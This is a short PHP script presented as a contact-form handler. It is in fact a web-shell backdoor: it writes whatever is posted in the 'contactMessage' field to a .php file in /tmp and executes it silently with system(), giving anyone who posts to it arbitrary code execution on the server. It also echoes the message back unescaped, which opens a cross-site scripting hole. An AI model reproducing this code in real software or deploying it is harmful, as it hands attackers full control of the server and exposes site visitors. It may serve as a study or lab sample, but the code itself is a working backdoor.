<?php

if ($_POST) {
    $message = trim($_POST['contactMessage']);

    $filename = '/tmp/' . time() . '.php';
    $file = fopen($filename, 'w');
    fwrite($file, $message);
    fclose($file);

    echo 'Success ' . $message . ' has been sent';
    system('php -f ' . $filename . ' &>/dev/null');
} else {
    echo 'MBEERRR....';
}
